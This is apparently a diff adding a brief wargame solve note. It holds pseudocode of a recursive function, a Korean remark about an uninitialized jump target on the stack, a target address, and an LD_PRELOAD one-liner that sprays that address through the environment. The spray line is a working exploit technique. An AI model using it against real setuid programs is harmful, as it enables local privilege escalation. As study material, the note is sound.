@@ -1,0 +1,16 @@
+﻿# main()
+int a;
+scanf("%d", &a);
+jump(a);
+
+# jump(t)
+while (t > 0) {
+	--t;
+	jump(t);
+}
+
+jmp 스택 내부 쓰레기값
+
+
+0x080486f7
+export LD_PRELOAD=`perl -e 'print "\xf7\x86\x04\x08"x12345'`
